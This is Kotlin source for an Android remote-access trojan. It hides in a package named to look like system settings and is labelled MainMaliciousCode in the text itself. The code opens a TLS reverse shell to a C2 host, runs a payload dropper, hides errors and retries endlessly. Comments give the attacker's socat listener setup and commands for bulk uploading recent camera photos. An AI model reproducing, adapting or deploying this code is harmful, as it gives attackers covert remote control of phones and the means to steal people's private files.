package org.android.settings

class MainMaliciousCode {

    /* Generate certificate for TLS:
    * openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -out bind.crt
    *   cat bind.key bind.crt > bind.pem
    *
    * Generate a Client connection:
    *   sudo socat -d -d OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork STDOUT
    *
    * Bulk upload example
    * 	cd ./DCIM/Opencamera && find $(pwd) -type f -mtime -30 -exec upload {} \;
    * 	find $(pwd) -type f -mtime -60 -exec upload {} \;
    */

    object C2 {
        const val IP    = "myc2.server.it"
        const val RPORT = 443
        const val RETRY = 5
    }

    companion object {
        fun start() {
            object : Thread() {
                override fun run() {
                    main()
                }
            }.start()
        }

        private fun main() {
            while (true) {
                try {

                    /* Open new TLS socket */
                    val secureSocket = SecureSocket(C2.IP, C2.RPORT, false)
                    val socketInput  = secureSocket.socketInput
                    val socketOutput = secureSocket.socketOutput

                    /* Drop additional payloads  */
                    try                  { Dropper() }
                    catch (e: Exception) { /* Log.d("Settings", e.stackTraceToString()) */ }
                    catch (e : Error)    { /* Log.d("Settings", e.stackTraceToString()) */ }

                    /* Set shell environment */
                    val shell = Shell(
                        """
                        clear;
                        HOME=/storage/self/primary;
                        DEN=/data/data/org.android.settings;
                        BINS=/data/data/org.android.settings/.files/usr/bin;
                        PATH=${'$'}BINS:${'$'}DEN:${'$'}PATH;
                        alias curl='curl --dns-servers 8.8.8.8,8.8.4.4 --insecure --silent';
                        alias ipinfo='echo ${'$'}(ipinfo)';
                        mkdir -p ${'$'}BINS;
                        cd ${'$'}HOME;
                        ls -al;
                        """.trimIndent())

                    val shellStdout = shell.stdout
                    val shellStdin = shell.stdin

                    secureSocket.readFromSocketWriteIntoStreamAsync(socketInput, shellStdin)
                    secureSocket.readFromStreamWriteIntoSocket(shellStdout, socketOutput)

                }
                catch (e: Exception) { /* Log.d("Settings", e.stackTraceToString()) */ }
                catch(e : Error)     { /* Log.d("Settings", e.stackTraceToString()) */ }

                Thread.sleep((C2.RETRY * 1000).toLong())
            }
        }
    }
}
